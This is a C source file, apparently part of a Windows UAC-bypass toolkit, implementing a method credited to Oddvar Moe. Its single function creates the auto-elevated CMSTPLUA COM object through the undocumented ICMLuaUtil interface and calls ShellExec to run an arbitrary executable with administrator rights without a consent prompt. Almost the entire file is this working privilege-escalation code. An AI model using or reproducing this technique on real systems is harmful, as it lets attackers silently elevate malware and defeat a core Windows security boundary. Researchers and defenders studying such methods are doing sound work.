/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       API0CRADLE.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  UAC bypass method from Oddvar Moe aka api0cradle.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
)
{
    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
    HRESULT          r = E_FAIL, hr_init;
    BOOL             bApprove = FALSE;
    ICMLuaUtil      *CMLuaUtil = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Potential fix check.
        //
        if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
            if (bApprove == FALSE)
                if (ucmShowQuestion(UACFIX) != IDYES) {
                    MethodResult = STATUS_CANCELLED;
                    break;
                }
        }

        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            (void**)&CMLuaUtil);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
            lpszExecutable,
            NULL,
            NULL,
            SEE_MASK_DEFAULT,
            SW_SHOW);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}
